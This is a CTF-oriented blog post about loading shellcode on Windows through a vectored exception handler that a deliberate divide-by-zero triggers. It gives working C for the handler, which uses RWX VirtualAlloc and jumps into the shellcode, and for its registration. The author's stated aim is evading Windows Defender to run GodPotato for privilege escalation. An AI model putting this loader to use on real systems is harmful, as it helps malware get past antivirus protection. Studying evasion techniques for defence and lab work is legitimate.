---
title: 1/0 = reverse shell ??
description: Deep dive into a unique shellcode loading technique
date: 2025-01-10 17:24:00 +0000
categories:
  - Windows
  - Programming
tags:
  - Windows
  - Shellcode
image: assets/img/visual_studio.png
---
In this blog post I'll explain how to load your shellcode using a really neat technique abusing VectorExceptions, a windows way of catching exceptions.

## Context
For the past few weeks I've been trying to finish my first htb fortress.
After gaining access to a windows machine, which had SeImpersonate so it was a quick win, I tried to use godpotato.exe to escalate.
And then everything to shambles. I spent a lot of time trying to get godpotato on the box and it kept getting deleted by windows defender.
Commonly used techniques to bypass AV include converting your exe to raw assembly (the shellcode) and running it through another binary (the loader).
Since I don't have the skills to create a shellcode from a binary, I used [donut](https://github.com/TheWover/donut) which works great for now !
Now I only had to create my shellcode loader :)

## VirtualAlloc ?
I decided that I wanted to create my own shellcode loader, which I did using visual studio 2022. I first used VirtualAlloc like absolutely every shellcode loader does on this planet. It's really straightforward, all you do is create executable memory, put your shellcode inside, and jump to it. I wanted to get more creative so I searched for more unique ways and I found a really funny one, vector excpetions. What I mean by funny is that the code that triggers the shellcode is the following :
```C
	int a = 1;
	int b = 0;
	int result = a / b;
```
Yes, it's the actual code in my shellcode loader ^^.
I know I know it sounds confusing at first, but don't worry it will all come together.
When your program reaches this, it will raise an exception and will iterate through a list of "vectored exception handlers", which is a fancy word for functions that will be called, one after the other before one of them can solve the exception. All we need to do is create an ExceptionHandler and register it so it will be called when an error occurs. I could go on and explain step by step but this snippet will explain it better than I :
```C
LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo) {
	// Check if it's a divide by zero exception
	if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO) {
		printf("[+] Exception caught, running shellcode ...\n");
		// Just in case
		if (g_shellcode == NULL || g_shellcodeSize == 0) {
			printf("[X] Shellcode error :(\n");
			return EXCEPTION_CONTINUE_SEARCH;  // Keep going to not make everything crash if shellcode is invalid
		}
		// VirtualAlloc shellcode as usual
		void* execMem = VirtualAlloc(NULL, g_shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (execMem == NULL) {
			printf("[X] VirtualAlloc error (huh ?)\n");
			return EXCEPTION_CONTINUE_SEARCH;  // Keep going to not make everything crash if shellcode is invalid
		}
		memcpy(execMem, g_shellcode, g_shellcodeSize);
		((void(*)())execMem)();  // Telephone meeeee

		VirtualFree(execMem, 0, MEM_RELEASE);

		return EXCEPTION_EXECUTE_HANDLER;  // Not make an infinite loop
	}
	// Not my fault
	return EXCEPTION_CONTINUE_SEARCH;
}
```
As you can see, this will trigger only if an int divide by zero exception is raised.
I could've done this with other types of exceptions but triggering a shellcode when dividing by zero was just better ^^.

If you paid attention you realise that we need to register our ExceptionHandler, which is done like this :
```C
	if (AddVectoredExceptionHandler(1, ExceptionHandler) == NULL) {
		printf("[X] Couldn't add an Exception Handler sadly\n");
		return;
	}
```
Reading the [docs](https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredexceptionhandler), we see that the first argument just needs to be non zero so that our ExceptionHandler will be called first.

## Done :)
Then you can just run the code and it will trigger you shellcode ! 
This technique is still recent, and I need to give credit to [this blog post](https://securityintelligence.com/x-force/using-veh-for-defense-evasion-process-injection/) for explaining the inner workings of windows Exceptions.

It gave me motivation to code my own shellcode loader, which you can checkout [here](https://github.com/0xtensho/ExtremeShellcode). 
It's useful for ctf's as it gets the shellcode through http before executing it, allowing you to upload only the loader. 
There are tons of other ways to run a shellcode, but of course the best way is the way that is still unknown by windows defender.
